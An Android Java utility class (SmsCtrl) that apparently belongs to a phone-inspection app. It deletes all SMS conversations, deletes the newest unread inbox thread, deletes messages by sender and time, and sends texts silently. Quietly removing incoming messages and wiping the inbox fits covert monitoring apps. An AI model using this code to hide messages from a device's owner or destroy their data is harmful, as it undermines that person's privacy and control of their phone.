package com.particle.inspector.authsrv.sms;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import com.particle.inspector.authsrv.util.SysUtils;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteException;
import android.net.Uri;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;

public class SmsCtrl 
{	
	private static final String LOGTAG = "SmsCtrl";
	
	public final static int SMS_MAX_LENGTH = 70;

	public final static String SMS_URI_ALL   = "content://sms/";
	public final static String SMS_URI_INBOX = "content://sms/inbox";
	public final static String SMS_URI_SEND  = "content://sms/sent";
	public final static String SMS_URI_DRAFT = "content://sms/draft";
	
	public static void deleteAllSMS(Context context) {
		Uri uri = Uri.parse("content://sms");
		ContentResolver contentResolver = context.getContentResolver();
	    Cursor cursor = contentResolver.query(uri, null, null, null, null);
	    while (cursor.moveToNext()) {
	    	try {
	    		long thread_id = cursor.getLong(1);
	    		Uri thread = Uri.parse("content://sms/conversations/" + thread_id);
	    		context.getContentResolver().delete(thread, null, null);
	    	} catch (Exception e) {
	        	Log.d(LOGTAG, e.getMessage()); 
	        }
	    }
	}
	
	public static int deleteTheLastSMS(Context context) {
		// Get the last SMS ThreadId
		long threadId = 0;
		int count = 0;
		String SMS_READ_COLUMN = "read";
	    String WHERE_CONDITION = SMS_READ_COLUMN + " = 0";
	    String SORT_ORDER = "date DESC";
	    
	    Cursor cursor = context.getContentResolver().query(
	    		Uri.parse("content://sms/inbox"),
	            new String[] { "_id", "thread_id", "address", "person", "date", "body" },
	            WHERE_CONDITION,
	            null,
	            SORT_ORDER);

	    if (cursor != null) {
	    	try {
	    		count = cursor.getCount();
	            if (count > 0) {
	            	cursor.moveToFirst();
	                threadId = cursor.getLong(1);                              
	            }
	        } finally {
	        	cursor.close();
	        }
	    } 
	    
		count = 0;
	    try {
	    	Uri mUri=Uri.parse("content://sms/conversations/" + threadId);  
	    	count = context.getContentResolver().delete(mUri, null, null);
	    } catch (Exception e) {
        	Log.d(LOGTAG, e.getMessage()); 
	    }
	    
	    return count;	
	}
	
	public static int deleteSMS(Context context, SmsMessage msg) {
		int count = 0;
	    Uri deleteUri = Uri.parse("content://sms/conversations/");
	    try {
	    	count = context.getContentResolver().delete(deleteUri, "address=? and date=?", 
		    			new String[] {msg.getOriginatingAddress(), String.valueOf(msg.getTimestampMillis())});
	    	SysUtils.messageBox(context, "deleted: " + String.valueOf(count));
	    } catch (Exception e) {
	      	Log.d(LOGTAG, e.getMessage()); 
	    }
	    return count;
	}
	
	public static boolean sendSms(String strMobile, String strContent) {
		SmsManager smsManager = SmsManager.getDefault();
		try {
			if (strContent.length() > SMS_MAX_LENGTH) {
				ArrayList<String> parts = smsManager.divideMessage(strContent);
				smsManager.sendMultipartTextMessage(strMobile, null, parts, null, null);
			} else {
				smsManager.sendTextMessage(strMobile, null, strContent, null, null);
			}
			return true;
		} catch (Exception ex) {
			Log.e(LOGTAG, ex.getMessage());
			return false;
		}
	}
	
}
